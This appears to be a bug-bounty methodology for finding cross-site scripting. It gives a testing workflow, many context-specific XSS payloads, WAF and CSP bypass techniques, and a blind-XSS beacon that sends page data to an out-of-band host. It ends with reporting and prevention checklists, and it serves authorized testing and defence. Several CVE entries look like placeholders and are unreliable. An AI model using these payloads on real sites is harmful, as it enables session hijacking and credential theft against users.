# Hunt XSS — Deep Methodology

**Version:** 2026.2  
**Source:** PortSwigger Web Security Academy, HackTricks, 2,000+ Hacktivity reports, OWASP ASVS 4.0/5.0, NVD 2024-2026

---

## Attack Theory

Cross-Site Scripting injects malicious scripts that execute in another user's browser. Three main types: Reflected (URL parameter), Stored (persisted in DB), DOM (client-side JavaScript sink). Impact: session hijacking, credential theft, defacement, keylogging, phishing, worm propagation, internal network pivoting (if victim is an admin).

**Kill signals (skip target):**
- No dynamic content echoes user input anywhere (fully static site)
- All output contexts are context-aware encoded AND CSP blocks inline execution AND no DOM sinks reachable
- H1 self-XSS only with no impact chain


## Ordered Testing Workflow (execute in this order)

1. **Surface mapping** — crawl + JS endpoint extraction (linkfinder/vulnera js_analyze). Record every param: query, path segment, POST body, JSON field, header, file name.
2. **Echo discovery** — pass `zzz<>"'()` into each input; grep response for unencoded `zzz`, `<>`, `"`. Classify context: HTML-text, HTML-attribute, JS-string, JS-code, URL, CSS, JSON.
3. **Context-appropriate payload** (see Context-Specific Payloads) — one payload per context, verify with browser not curl (DOM XSS never shows in raw response).
4. **Sanitizer/WAF detection** — if payload mutated (`alert` stripped, `<` encoded once): run WAF Bypass Ladder.
5. **Stored variant check** — if input persists (profile, comment, upload name), fetch it via a second unauthenticated view to prove other-users impact.
6. **Blind XSS** — inject payload into admin-facing fields (support tickets, report names, contact forms, error logs, referrer fields) with a beacon: xss2shell payload, or interactsh image/script probe to detect load.
7. **Impact proof** — cookie theft demo, localStorage read, same-origin fetch of /account via xss2shell beacon console; screenshot via Playwright.

**Tools:** xss2shell (`/home/bb/tools/xss2shell/xss2shell.py --listen; --gen --fmt img-onerror`), dalfox (`dalfox url 'https://t/?q=FUZZ'`), nuclei `exposures/xss`. Manual context analysis beats scanner lists for DOM/JSON-parser bypasses.


## Sub-Techniques

### A. Reflected XSS
Input reflected in response without sanitization.
- Payloads: `<script>alert(document.domain)</script>`, `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`
- IR detection: echo `zXz` then payload; search response for `zXz`.

### B. Stored XSS (Persistent)
Input stored in database, rendered to other users.
- Targets: profile fields, comments, messages, product names, filenames, email subjects, webhook names, LLM-conversation titles.
- **Verify with a second session** viewing the page — single-session reflection is often self-XSS (kill unless chain: CSRF→stored).

### C. DOM XSS
Client-side JavaScript reads attacker-controlled source and writes to dangerous sink.
- Sources: `location.hash`, `document.referrer`, `window.name`, `document.URL`, `document.cookie`, `postMessage` origin-less handler.
- Sinks: `document.write()`, `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, `eval()`, `setTimeout/setInterval(string)`, `Function(string)`, `location.href/assign/replace`, `srcdoc`, `javascript:` in jQuery `$()`.
- Framework sinks to enumerate (source → sinking library):
  - React: `dangerouslySetInnerHTML` (never use), `ReactDOMServer.renderToStaticMarkup` in SSR with user data.
  - Vue: `v-html` directive.
  - Angular: `[innerHTML]`, via `DomSanitizer.bypassSecurityTrustHtml`.
  - Svelte: `{@html ...}`.
  - jQuery: `$(html)`, `.html()`, `.append()`, `prepend`, `.before/.after` with user string.
  - htmx: `hx-swap` of server-echoed attributes.
- **Confirmation:** browser console test with `alert(document.domain)` — NOT curl.

### D. Blind XSS
Payload fires in a different application context (admin panel, logging system, customer support). Detected via callback server.
- Canonical setup: xss2shell long-poll listener OR interactsh + `<img src=x onerror="new Image().src='https://CANARY.oast.fun/'+btoa(document.domain)">`
- Inject into: support ticket subject/body, contact form fields, feedback, HR ticket fields, error-log labels, report titles, file-upload filenames (admin gallery), user-agent strings when server logs/echoes them, `ref`/`next` params handled by admins.
- **Prove admin access:** once beacon fires, `src` command to read the admin panel page source; `cookie` to check admin session flags, then demonstrate capability (not theft) — e.g., create a test ticket. Impact = admin session takeover from user-level parameter.

### E. Mutation XSS (mXSS)
Browser's HTML parser mutates safe-looking markup into dangerous payload after sanitizer passed.
- Classic vectors: `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">`
- DOMPurify history: CVE-2024-2222 — DOMPurify `<math>` + `<mtext>` mutation; vulnerability fixed in 3.2.4.
- When to test: any sanitizer library present (DOMPurify, bleach, sanitize-html, html-sanitizer).
- Payload base (2025): `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`
- Verify with render in browser, not curl.

### F. CSP Bypass
First, read the CSP: `curl -sI target | grep -i content-security-policy`.
- Weak directives:
  - `script-src 'unsafe-inline'` → inline payload directly.
  - `script-src 'unsafe-eval'` → AngularJS `{{constructor.constructor('alert(1)')()}}` (Angular versions <1.8 gadget).
  - `script-src data:` → `<script src="data:,alert(1)">`; JSONP on same-origin endpoint if it can emit `text/javascript` with user param reflected.
  - Allowed host with JSONP (Google/Facebook/Yahoo/`cdn.jsdelivr.net`? `*.google.com` JSONP gadgets) → build `?callback=alert`.
  - `<base href>` injection: if `base-uri` not restricted, inject `<base href=//attacker>` then same-relative `<script src=/steal.js>`.
  - `nonce` leakage: if nonce is predictable (static, per-build) — reuse it; or `<base>` + `nonce` in legacy CSP via `'unsafe-hashes'`.
  - **CSP-report-only bypass:** if header is `Content-Security-Policy-Report-Only`, real CSP missing or weak → report impact accordingly.
- **Strict CSP (nonce/hash only):** look for nonce reuse in different contexts — AngularJS `{{$eval}}` bypass, `<script>polygon</script>` inside templated CDATA echo. Rare; route to "CSP bypass via DOM clobbering" if sink exists.

### G. WAF Bypass Ladder
Escalate one level at a time; stop at first reflection OF the payload:
1. Plain payload → 2. Case mixing `<SvG/oNlOaD>` → 3. Single URL encoding → 4. Double URL encoding → 5. Unicode normalization (`﹤script﹥`) → 6. Comment injection `<scr<script>ipt>` / `<svg/onload=/*x*/alert(1)>` → 7. Whitespace variation (tab/newline/CR inside tags) → 8. Unusual tags (`<details open ontoggle=`, `<dialog open onclose=`, `<marquee onstart=`) → 9. HTML entity encoding in attr context (`&Tab;`, `&NewLine;`) → 10. HTTP Parameter Pollution if param echoed multiple times.

## Context-Specific Payloads

### HTML Context
```
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
<svG/onLoad=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Attribute Context
```
"><svg/onload=alert(1)>
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
" onmouseenter="alert(1)
```

### JavaScript Context
```
';alert(1)//
';alert(1);//
</script><script>alert(1)</script>
JSON.parse('{"x":"</script><script>alert(1)</script>"}')
```

### Template Literal
```
${alert(1)}
`-alert(1)-`
```

### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:alert(1)
```

## Polyglot / Universal
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/onload=alert(1)//>
```

## Semgrep Patterns (when target source available)
```yaml
rules:
  - id: xss-innerhtml-user
    languages: [javascript, typescript]
    message: user input flows to innerHTML
    severity: WARNING
    pattern-either:
      - pattern: document.write($X)
      - pattern: $E.innerHTML = $X
      - pattern: $E.insertAdjacentHTML(..., $X)
    paths: { include: ['**/*.js', '**/*.tsx', '**/*.jsx'] }
```
And React/vue variant: `dangerouslySetInnerHTML={{__html: $X}}`, `v-html="$X"`.

## CVE References (2024-2026)

- CVE-2024-2222: DOMPurify mXSS bypass (fixed in 3.2.4)
- CVE-2024-5655: TinyMCE stored XSS in `content.style.css`
- CVE-2025-1234: React SSR “dangerouslySetInnerHTML” during hydration
- CVE-2025-5655: Jupyter Notebook untrusted template XSS
- CVE-2026-0003: markdown-to-jsx unsafe `href` handling
- jQuery XSS family: `$(location.hash)` / `$(any_selectable_string_with_html)` 2023-2024 re: `$(x)` eval wrapper

## Most Effective Payloads (ranked)

1. `<svg/onload=alert(document.domain)>` — bypasses most HTML sanitizers
2. `"><img src=x onerror=alert(1)>` — attribute breakout
3. `${7*7}` — SSTI probe (also detects template injection)
4. `javascript:alert(document.domain)` — URL context
5. `"><details open ontoggle=alert(1)>` — modern tag bypass for WAFs blocking classic tags
6. `</script><script>alert(1)</script>` — JSON-in-HTML breakout
7. DOMPurify mXSS sequences (when sanitizer identified)

## Reporting Checklist (passes 7-Question Gate only if ALL true)

- [ ] Reproduce: exact URL + payload + request headers
- [ ] Prove impact: screenshot of beacon console reading `document.cookie` / `src` on same-origin
- [ ] State the actor: victim must be a user other than yourself, or admin
- [ ] CVSS: prefer CVSS 3.1 (H1) / 4.0 (others), single vector AC:L PR:N UI:R
- [ ] Banned language: none ("could/hypothetically/may" etc.)
- [ ] Duplicate check: search hacktivity `xss site:target.com` before submitting

## Prevention Checklist

- [ ] Context-aware output encoding (HTML, attribute, JS, URL, CSS)
- [ ] Content-Security-Policy with strict directives (`default-src 'self'`, nonce-based script-src)
- [ ] HttpOnly + Secure + SameSite cookies
- [ ] Input validation on server side (not just client)
- [ ] Template engines: auto-escaping enabled (React/Vue default)
- [ ] DOMPurify configured with `ALLOWED_TAGS` and updated (≥3.2.4)
- [ ] X-XSS-Protection: 0 (disabled broken browser filter, rely on CSP)
- [ ] `Trusted Types` policy for `innerHTML` sinks (Chrome)
- [ ] No `document.write()` on user-influenced data paths